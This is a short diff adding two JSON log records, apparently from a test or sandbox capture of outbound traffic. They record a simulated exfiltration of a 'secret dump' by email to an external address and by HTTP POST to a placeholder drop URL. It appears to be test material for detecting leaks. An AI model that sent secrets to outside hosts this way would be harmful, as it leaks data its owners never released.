@@ -1,0 +1,2 @@
+{"ts": "2026-10-18T17:28:02.936803+00:00", "channel": "email", "to": "soc@external.example", "subject": "exfil", "body": "secret dump", "attachments": [], "body_len": 11}
+{"ts": "2026-10-18T17:28:02.937011+00:00", "channel": "http_post", "url": "https://drop.invalid/collect", "data": "secret dump", "data_len": 11}
